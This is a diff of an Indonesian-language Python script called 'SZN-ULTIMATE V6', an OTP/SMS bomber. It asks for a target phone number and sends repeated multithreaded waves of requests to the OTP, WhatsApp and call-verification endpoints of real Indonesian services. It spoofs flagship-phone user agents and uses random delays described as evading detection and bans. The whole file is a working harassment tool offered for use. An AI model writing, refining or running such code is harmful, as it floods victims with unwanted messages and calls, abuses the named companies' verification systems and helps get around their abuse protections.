@@ -3,122 +3,116 @@ import threading
 import time
 import random
 import os
-import sys
 from datetime import datetime
 
-# --- WARNA MODEREN (BIAR GAK MINUS MATANYA) ---
-G = '\033[92m'  # Hijau Terang
-R = '\033[91m'  # Merah Terang
-Y = '\033[93m'  # Kuning
-B = '\033[94m'  # Biru
-C = '\033[96m'  # Cyan
-W = '\033[0m'   # Reset
+# --- SETTING WARNA (BIAR GAK LAWAK) ---
+G = '\033[32m' # Hijau
+R = '\033[31m' # Merah
+Y = '\033[33m' # Kuning
+W = '\033[37m' # Putih
+C = '\033[36m' # Cyan
 
-class SZN_AutoPilot_Engine:
+class SZN_V6_REBORN:
     def __init__(self, target):
-        self.target_raw = target
-        self.target_intl = self.format_ke_intl(target) # Format +62
-        self.target_local = self.format_ke_local(target) # Format 08
+        # Auto-format nomor ke standar internasional +62
+        self.target = self.format_target(target)
+        self.num_only = self.target.replace("+62", "0") # Untuk API yang minta 08
         self.success = 0
         self.failed = 0
         self.lock = threading.Lock()
         
-        # DATABASE USER-AGENT (Nyamar jadi HP Flagship)
-        self.device_pool = [
-            "Samsung Galaxy S24 Ultra Build/UP1A.231005.007",
-            "iPhone 15 Pro Max; CPU iPhone OS 17_4 like Mac OS X",
-            "Google Pixel 8 Pro Build/UD1A.231105.004",
-            "Xiaomi 14 Pro; Android 14; HyperOS"
+        # Kumpulan identitas HP High-End (Bypass Detector)
+        self.ua_list = [
+            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.63 Mobile Safari/537.36"
         ]
 
-    def format_ke_intl(self, n):
-        n = n.replace("+", "").replace(" ", "").replace("-", "")
-        if n.startswith("08"): return "+62" + n[1:]
-        if n.startswith("8"): return "+62" + n
-        if n.startswith("62"): return "+" + n
-        return "+" + n
+    def format_target(self, num):
+        num = num.strip().replace(" ", "").replace("-", "")
+        if num.startswith("08"): return "+62" + num[1:]
+        if num.startswith("8"): return "+62" + num
+        if num.startswith("62"): return "+" + num
+        return num
 
-    def format_ke_local(self, n):
-        n = n.replace("+", "").replace(" ", "").replace("-", "")
-        if n.startswith("62"): return "0" + n[2:]
-        if n.startswith("8"): return "0" + n
-        return n
-
-    def get_fake_headers(self):
+    def get_headers(self, referer):
         return {
-            'User-Agent': f"Mozilla/5.0 (Linux; Android 14; {random.choice(self.device_pool)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+            'User-Agent': random.choice(self.ua_list),
+            'Accept': 'application/json, text/plain, */*',
             'Content-Type': 'application/json',
-            'Referer': 'https://www.google.com/',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive'
+            'Origin': referer,
+            'Referer': referer,
+            'X-Requested-With': 'XMLHttpRequest'
         }
 
-    def execute_strike(self, api_name, url, payload_func):
-        """Mesin Eksekusi Peluru Otomatis"""
+    def fire(self, mode):
+        """Mesin Eksekusi Peluru"""
         try:
-            payload = payload_func()
-            headers = self.get_fake_headers()
-            
-            # Request dengan timeout panjang biar gak gampang timeout
-            res = requests.post(url, json=payload, headers=headers, timeout=20)
+            if mode == "WA":
+                url = "https://dashboard.skillacademy.com/api/v1/auth/otp"
+                data = {"phoneNumber": self.num_only}
+                ref = "https://skillacademy.com/"
+            elif mode == "SMS":
+                url = "https://api.matahari.com/v1/auth/otp"
+                data = {"phone": self.num_only, "type": "register"}
+                ref = "https://www.matahari.com/"
+            elif mode == "CALL":
+                url = "https://api.alodokter.com/v1/auth/otp_call"
+                data = {"phone": self.num_only}
+                ref = "https://www.alodokter.com/"
+
+            # Request dengan Timeout lebih panjang (Anti-Macet)
+            res = requests.post(url, json=data, headers=self.get_headers(ref), timeout=20)
             
             with self.lock:
-                status = f"{G}SUCCESS{W}" if res.status_code in [200, 201] else f"{R}FAIL ({res.status_code}){W}"
-                if "SUCCESS" in status: self.success += 1
-                else: self.failed += 1
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] {C}{api_name:15}{W} => {status}")
+                if res.status_code in [200, 201]:
+                    self.success += 1
+                    print(f"{G}[{datetime.now().strftime('%H:%M:%S')}] {mode} => SUCCESS!{W}")
+                else:
+                    self.failed += 1
+                    print(f"{R}[{datetime.now().strftime('%H:%M:%S')}] {mode} => GAGAL ({res.status_code}){W}")
         except:
             with self.lock:
                 self.failed += 1
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] {Y}{api_name:15}{W} => {R}TIMEOUT/BLOCK{W}")
+                print(f"{Y}[TIMEOUT] Jalur {mode} Sibuk!{W}")
 
-    def start_storm(self, wave_count):
-        # DAFTAR API TERPILIH (SMS, WA, CALL)
-        api_list = [
-            ("WA-SKILL-ACA", "https://dashboard.skillacademy.com/api/v1/auth/otp", lambda: {"phoneNumber": self.target_local}),
-            ("SMS-MATAHARI", "https://api.matahari.com/v1/auth/otp", lambda: {"phone": self.target_local, "type": "register"}),
-            ("CALL-ALODOK", "https://api.alodokter.com/v1/auth/otp_call", lambda: {"phone": self.target_local}),
-            ("WA-KREDIT-PT", "https://api.kreditpintar.com/v1/auth/otp", lambda: {"phone": self.target_local, "category": "SIGN_IN"})
-        ]
-
-        for w in range(wave_count):
-            print(f"\n{B}>>> MENGIRIM GELOMBANG KE-{w+1} <<<{W}")
-            threads = []
-            for name, url, p_func in api_list:
-                t = threading.Thread(target=self.execute_strike, args=(name, url, p_func))
-                threads.append(t)
+    def storm(self, waves):
+        for i in range(waves):
+            print(f"\n{C}[ GELOMBANG {i+1} ] Menyerang...{W}")
+            ths = []
+            for m in ["WA", "SMS", "CALL"]:
+                t = threading.Thread(target=self.fire, args=(m,))
+                ths.append(t)
                 t.start()
             
-            for t in threads: t.join()
+            for t in ths: t.join()
             
-            # SMART AUTO-DELAY (Rahasia Anti-Banned)
-            jeda = random.uniform(4.0, 8.5)
-            print(f"{Y}[!] Cooling system: {jeda:.2f} detik...{W}")
-            time.sleep(jeda)
+            # AUTO-DELAY ALGORITHM (SZN-Logic)
+            # Biar gak gampang kena block, jeda acak 4-8 detik
+            wait = random.uniform(4.0, 8.5)
+            print(f"{Y}[SYSTEM] Cooling down {wait:.1f}s...{W}")
+            time.sleep(wait)
 
-def display_banner():
+def banner():
     os.system('clear')
     print(f"""{C}
-    ╔══════════════════════════════════════════════════╗
-    ║   {G}SZN-OTP ULTIMATE V6 {W}- {R}AUTO-PILOT BRUTAL MODE{C}   ║
-    ║   {W}Target Intl: {Y}+62-8xxx {W}| {W}Engine: {G}Multi-Threaded{C}   ║
-    ╚══════════════════════════════════════════════════╝{W}""")
+    ╔════════════════════════════════════════╗
+    ║     {R}SZN-ULTIMATE V6 {G}(REBORN EDITION){C}     ║
+    ║   {W}Target: {G}International +62 Protocol   {C}  ║
+    ╚════════════════════════════════════════╝{W}
+    """)
 
 if __name__ == "__main__":
-    display_banner()
-    num = input(f"{B}[?] Input Target (Contoh: 0896xxx): {W}")
-    bot = SZN_AutoPilot_Engine(num)
+    banner()
+    target = input(f"{W}Input Nomor (+62/08): ")
+    bot = SZN_V6_REBORN(target)
     
-    print(f"{G}[+] Target Terkunci: {bot.target_intl}{W}")
-    gelombang = int(input(f"{B}[?] Jumlah Serangan (Wave): {W}"))
+    print(f"{G}[!] Target Locked: {bot.target}{W}")
+    waves = int(input(f"{W}Jumlah Gelombang Serangan: "))
     
-    print(f"\n{R}[WARNING] SERANGAN DIMULAI! SI SANZ BAKAL PANAS...{W}")
-    try:
-        bot.start_storm(gelombang)
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Serangan Dihentikan Paksa oleh User.{W}")
+    print(f"\n{R}[!!!] MEMULAI PEMBOMAN...{W}")
+    bot.storm(waves)
     
-    print(f"\n{C}═══ [ RINGKASAN SERANGAN ] ═══")
-    print(f"{G}BERHASIL : {bot.success}")
-    print(f"{R}GAGAL    : {bot.failed}{W}")
-        
+    print(f"\n{C}--- [ LAPORAN SELESAI ] ---")
+    print(f"{G}BERHASIL: {bot.success} | {R}GAGAL: {bot.failed}{W}")
+            
